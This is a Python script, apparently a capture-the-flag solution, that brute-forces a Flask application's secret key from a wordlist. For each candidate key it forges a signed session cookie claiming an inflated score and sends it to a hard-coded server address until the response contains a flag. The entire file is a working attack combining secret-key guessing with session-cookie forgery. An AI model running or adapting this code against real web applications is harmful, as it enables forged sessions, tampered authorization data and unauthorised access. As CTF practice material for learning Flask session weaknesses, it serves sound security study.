#!/usr/bin/env python3
""" Flask Session Cookie Decoder/Encoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

# standard imports
import sys
import zlib
import requests
from itsdangerous import base64_decode
import ast

# external Imports
from flask.sessions import SecureCookieSessionInterface


class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key


def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(
            ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)


if __name__ == '__main__':
    url = "http://34.143.157.242:8006"
    with open('dict.txt') as file:
        keys = [k.strip() for k in file.readlines()]

    target = '{"ans": 26822154,"question": "3015*8896+714","score": 100000000}'

    for key in keys:
        print(f"Trying key {key}")
        k = encode(key.strip(), target)
        print(f"Cookie: {k}")
        resp = requests.get(url, cookies={'session': k})
        if "greyhats{" in resp.text:
            print(f"Found it! Flag: {resp.text}")
